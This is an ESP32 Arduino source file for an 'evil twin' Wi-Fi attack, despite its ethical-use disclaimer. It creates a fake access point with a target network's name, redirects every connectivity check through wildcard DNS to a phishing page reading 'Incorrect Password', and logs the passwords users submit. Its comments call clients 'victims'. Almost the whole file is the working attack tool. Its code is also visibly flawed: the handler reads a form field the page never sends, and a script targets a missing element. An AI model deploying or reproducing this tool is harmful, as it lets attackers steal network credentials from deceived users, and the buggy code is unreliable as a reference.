/*
 * Copyright (c) 2024 Baccara Oussama (aka ignorant05).
 *
 * This code is licensed under the MIT License. You are free to use, modify, and distribute this code, 
 * provided that the original copyright notice and this permission notice are included in all copies 
 * or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
 * AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
 * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 * 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 * 
 * Ethical Use Warning
 *
 * This captive Wi-Fi code is intended for educational and ethical purposes only. 
 * It is designed to demonstrate how to create a captive portal for legitimate use cases, 
 * such as providing internet access in public spaces or for personal projects.
 *
 * **Important:**
 * - Do not use this code to intercept, monitor, or manipulate network traffic without the explicit 
 *   consent of the users involved.
 * - Ensure that users are informed about the nature of the captive portal and any data that may 
 *   be collected during their use of the network.
 * - Comply with all applicable laws and regulations regarding network usage and data privacy.
 *
 * By using this code, you agree to use it responsibly and ethically.
 */

/* including needed libraries : 
*   1- Arduino. h          : Provides the setup() and the loop() functions.
*   2- AsyncTCP.h          : used to monitor and respond to traffic effectively.
*   3- ESPAsyncWebServer.h : to start webserver.
*   4- DNSServer.h         : used to redirect all DNS queries to the ESP32's IP address.
*   5- esp_wifi.h          : to set the esp32 to soft AP mode.
*/

#include <Arduino.h> // Remove this if you are using Arduino IDE
#include <AsyncTCP.h>  
#include <ESPAsyncWebServer.h> 
#include <DNSServer.h>
#include <esp_wifi.h>

/* Declaring constants : Wi-Fi SSID and password.*/
const char* SSID = "Target_SSID";   // Change this to your wi-fi ssid (Name).
const char* Password = NULL; // Change this to your wi-fi password (or leave it as it is for open network).

#define MaximumClientNumber 5 // Define Maximum client number for the router.
#define Ch 6                  // Define the channel that the network will run on. 
#define DNS_interval 30       // Define the little delay for the dns to redirect victims(clients :)).

const IPAddress localIP(192,168,4,1);             // Declare the IP address of the esp32.
const IPAddress gatewayIP(192,168,4,1);           // The ip that the victim will be redirected to.
const IPAddress subnetMask(255,255,255,0);        // A subnet mask for the ip.
const String localIPURL = "http://192.168.4.1";   // The webserver address.

// The index.html webpage that the client will be redirected to... You can adjust it as needed (like changing the title or the button name).
const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <title>Incorrect Password</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; 
            font-family: Arial, sans-serif;
            background-color: #1c1c1e;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box; /* Ensure padding doesn't affect sizing */
        }

        h2 {
            font-size: 1.2rem;
            margin-bottom: 10px;
            font-weight: normal;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px; /* Adds even spacing between elements */
        }

        input[type="password"], 
        button {
            width: 100%; /* Make them fully occupy the container's width */
            padding: 10px;
            border-radius: 5px;
            box-sizing: border-box; /* Ensure padding doesn't break the width */
        }

        input[type="password"] {
            border: 1px solid #ccc;
            background-color: #333;
            color: white;
            font-size: 1rem;
        }

        button {
            font-size: 1rem;
            border: none;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Incorrect Password</h2>
        <form action="/submit" method="POST">
            <input type="password" id="password" name="password" placeholder="password" required>
            <button type="submit">Submit</button>
        </form>
    </div>
    <script>
        // Dynamically update the SSID placeholder
        document.getElementById('ssid-placeholder').textContent = "Guest Network"; // Replace with your dynamic SSID
    </script>
</body>
</html>)=====";

// Declaring the server and dns variables.
DNSServer DNSS;
AsyncWebServer server(80);

// Function to setup & start the DNS server.
void SetupDNSS(DNSServer &dnsServer, const IPAddress &localIP) {
  DNSS.setTTL(3600);
  DNSS.start(53, "*", localIP); 
}

// Function to setup the esp32 as Fake access point.
void StartSAP(const char* SSID, const char *Password, const IPAddress &localIP, const IPAddress &getewayIP){
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(localIP,getewayIP,subnetMask);
  WiFi.softAP(SSID, Password, Ch, 0, MaximumClientNumber);

  esp_wifi_stop();
  esp_wifi_deinit();
  wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();

  my_config.ampdu_rx_enable = false;
  esp_wifi_init(&my_config);
  esp_wifi_start();
  vTaskDelay(100 / portTICK_PERIOD_MS);  
}

// Function the setup the webserver and the redirection to the localIP of the esp32.
void SetupWebserver(AsyncWebServer &server, const IPAddress &localIP) {

  // Providing Client the basic html webpage of the password input.
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(200, "text/html", index_html);
        response->addHeader("Cache-Control", "public,max-age=31536000");
        request->send(response);
        Serial.println("Serving Basic HTML Page");
    });

  // Handling the post request and print the password on the serial monitor.
  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
        String password = request->arg("Mot_de_passe");
        Serial.println("POST Request Triggered");
        Serial.println("Received Password: " + password); 
        request->send(200, "text/plain", "Password Received");
    });

  // Redirects requests from devices checking for internet connectivity (e.g., Firefox).
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32.
  }); 

  // Redirects requests from devices checking connectivity with Google's connectivity check.
  server.on("/connectivity-check.gstatic.com", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });

  // Redirects requests from devices trying to access the login page of the captive portal.
  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32.
  });

  // Redirects requests from devices checking for the presence of a captive portal.
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32.
  });

  // Redirects requests from Microsoft devices performing a connectivity check.
  server.on("/msftconnecttest/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32.
  });

  // Responds to requests for the Microsoft Network Connectivity Status Indicator (NCSI) test.
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", "Microsoft NCSI");  // Send a plain text response indicating NCSI.
  });

  // Redirects generic requests for a redirect page.
  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32.
  });

  // Redirects requests for the canonical HTML page, often used in connectivity checks.
  server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
  });

  // Redirects requests for network diagnostics, often used by various devices.
  server.on("/network-diagnostics.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);  // Redirect to the local IP of the ESP32
  });

  // Responds to requests for a success message, often used in connectivity checks.
  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", "success");  // Send a plain text response indicating success.
  });

  // Handle Windows, Linux, and ChromeOS network checks.
  server.onNotFound([](AsyncWebServerRequest *request) {
    Serial.print("onNotFound Triggered: URL = ");
    Serial.println(request->url());
    request->redirect(localIPURL);
  });

  server.begin();   // Starting the webserver.
}

// Setting up the needed things.
void setup() { 
  // Starting the serial monitor.
  Serial.setTxBufferSize(1024);
  Serial.begin(115200);

  while(!Serial);                                 // Wait for the Serial object to become available.
 
  StartSAP(SSID, Password, localIP, gatewayIP);   // Setting up the esp32 as a Soft AP ;
  SetupDNSS(DNSS, localIP);                       // Setting up the DNS server for redirections.
  SetupWebserver(server, localIP);                // Setting up the webserver.
}

// The loop function.
void loop() {
  DNSS.processNextRequest();  // Redirection every GET request.
  delay(DNS_interval);        // A little delay.
}